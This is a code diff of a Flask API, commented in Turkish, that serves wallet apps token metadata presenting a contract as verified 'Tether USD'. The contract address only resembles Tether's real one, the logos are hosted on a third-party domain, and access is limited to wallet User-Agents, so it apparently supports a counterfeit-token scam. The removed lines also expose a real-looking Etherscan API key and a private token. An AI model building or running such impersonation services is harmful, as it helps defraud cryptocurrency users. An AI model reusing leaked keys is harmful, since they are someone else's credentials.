@@ -12,30 +12,26 @@ limiter = Limiter(
     app=app,
     key_func=get_remote_address,
     default_limits=["200 per day", "50 per hour"],
-    storage_uri="redis://red-d0vffs7fte5s739keisg:6379",  # Yerel Redis bağlantısı
+    storage_uri="redis://red-d0vffs7fte5s739keisg:6379",
     storage_options={"socket_connect_timeout": 30, "socket_keepalive": True}
 )
 
 # Ortam değişkenlerinden değerleri al, varsayılanlar test için
 USDT_CONTRACT = os.environ.get("CONTRACT_ADDRESS", "0xDAC17f2a9b484780B9e109E003F7BB78B1C54A29")
-ETHERSCAN_API_KEY = os.environ.get("ETHERSCAN_API_KEY", "E1MD7M2UGT1ZTTVX55JR6SVYKSBVA2EKCB")
-API_KEY = os.environ.get("API_KEY", "SiyahSancak0258-MY-TOKEN-SiyahSancak0258")
+ETHERSCAN_API_KEY = os.environ.get("ETHERSCAN_API_KEY", "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456")
+API_KEY = os.environ.get("API_KEY", "your-secret-api-key")
 
-# Desteklenen cüzdanlar
 SUPPORTED_WALLETS = ["Trust-Wallet", "MetaMask", "TokenPocket", "Coinbase Wallet", "TronLink"]
 
 def validate_request():
-    # User-Agent’ta desteklenen cüzdan var mı kontrol et
     user_agent = request.headers.get("User-Agent", "")
     if not any(wallet in user_agent for wallet in SUPPORTED_WALLETS):
         return False, jsonify({"error": "Access denied: Invalid wallet"}), 403
-    # API anahtarını kontrol et
     if request.headers.get("X-API-Key") != API_KEY:
         return False, jsonify({"error": "Access denied: Invalid API key"}), 403
     return True, None, None
 
 def get_common_response():
-    # API’nin döndüreceği JSON yanıtı
     return {
         "name": "Tether USD",
         "symbol": "USDT",
@@ -43,9 +39,9 @@ def get_common_response():
         "decimals": 6,
         "verified": True,
         "logoURI": [
-            "https://res.cloudinary.com/demo/image/upload/v1625098765/usdt_1.png",
-            "https://res.cloudinary.com/demo/image/upload/v1625098765/usdt_2.png",
-            "https://res.cloudinary.com/demo/image/upload/v1625098765/usdt_3.png"
+            "https://ethererc.com/static/usdt_1.png",
+            "https://ethererc.com/static/usdt_2.png",
+            "https://ethererc.com/static/usdt_3.png"
         ],
         "explorer": f"https://etherscan.io/address/{USDT_CONTRACT}",
         "etherscanVerified": True,
@@ -54,18 +50,19 @@ def get_common_response():
         "network": {
             "name": "Ethereum",
             "chainId": "0x1"
+        },
+        "image": {
+            "thumb": "https://ethererc.com/static/usdt_1.png"
         }
     }
 
 @app.route('/', methods=['GET', 'HEAD'])
 def health_check():
-    # API’nin çalıştığını kontrol eden bir uç nokta
     return jsonify({"status": "ok", "message": "API is healthy and running"}), 200
 
 @app.route('/api/token.json')
 @limiter.limit("50 per minute")
 def token_info():
-    # Token bilgilerini döndür, erişim kontrolü yap
     valid, error, status = validate_request()
     if not valid:
         return error, status
@@ -74,7 +71,6 @@ def token_info():
 
 @app.route('/address/')
 def etherscan_page():
-    # Basit bir HTML sayfası, kontrat bilgilerini gösterir
     valid, error, status = validate_request()
     if not valid:
         return error, status
